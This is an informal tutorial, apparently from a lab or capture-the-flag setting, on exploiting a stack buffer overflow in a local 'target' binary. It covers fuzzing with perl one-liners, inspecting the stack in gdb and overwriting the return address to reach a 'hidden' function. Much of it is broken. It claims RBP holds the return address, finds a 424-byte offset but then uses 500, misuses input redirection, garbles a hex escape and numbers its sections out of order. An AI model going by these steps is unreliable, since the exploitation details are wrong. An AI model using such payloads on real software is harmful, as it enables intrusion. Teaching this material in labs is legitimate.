# Buffer Overflow

## 1. Fuzz
we have to find out if a buffer overflow even exists. 
We try different inputs to do so. Specifically, we are interested in *long* inputs, that potentially *overflow* a buffer somewhere in our target program.

How do we get long input in to our program?
Scripting languages like PERL (comes with all Linux distros) or Python (yes, you should know Python) can help you to a) craft long inputs and b) compose hex values.
`perl -e 'print "A"x200'`
`python -c 'print("asd"*200)`

Furhter, |, < and the expression evaluator $() can be used to combine commands.
We want to provide input via command line arguments, or STDIN.
Command Line:
'./target $(perl -e 'print "A"x200')'  
' perl -e 'print "A"x200' | xargs ./target '

STDIN:
'./target < perl -e 'print "A"x200''
or retain your payload (the A's) in a file:
'perl -e 'print "A"x200' > payload.txt'
'./target < payload.txt'

Lit, isn't it?

## 2. Observe
Debug your target, meaning analyze it *dynamically*
' gdb -q ./target '
Run it on the payload
' run < payload.txt '
Inspect registers and stack
' info registers '
' x/120x $rsp '
Wow, would be cooler if we had some breakpoints, so we can step through, right?
'disas main'
Shows you, where the target reads from STDIN, and you can set a breakpoint like
'b * vulnfunction+89'
or 
'b * 0x89089010'
Now inspect like
' info registers '
' x/120x $rsp '
' nexti '
' info registers '
' x/120x $rsp '
You should be able to see how the A's have not been on the stack *before* the read, but did then get loaded on to it by the read instruction. Wow!

# 4. Focus
What's our goal again?
1. Overwrite the return address
2. RBP is where the return address remains. We can inspect the RBP by using 'info registers'
3. Did we overwrite it yet? Hint: if the program seg faults you should be able to see the A's in the RBP at some point. Otherwise, you need more A's; try 500!
4. Remember: we want to overwrite the return address with our address of choice. We have to be damn precise!
5. Let's try using a couple of B's and C's to get a better overview of what's on the stack already.

'perl -e 'print "A"x500."BBBB"."CCCC"."DDDD"' > payload2.txt'

# 5. Make it happen
Playing around with the payload, we can see that 500 is to much, because RBP only consists of A's. 400 is to little, the RBP doesnt get overwridden. 
We hit the sweet spot at 424 A's B's and C's. Nice!

Now we can find our target address by using the debugger again:
' gdb -q ./target '
' disas hidden '
Take the first instruction after the prolog (the prolog is when RSP gets set to RBP at the beginning of each function).

Craft:
'perl -e 'print "A"x500."\78\x56\x34\x12\x00\x00\x00\x00"' > payload3.txt'
and boom:
' ./target < payload3.txt '













3. 




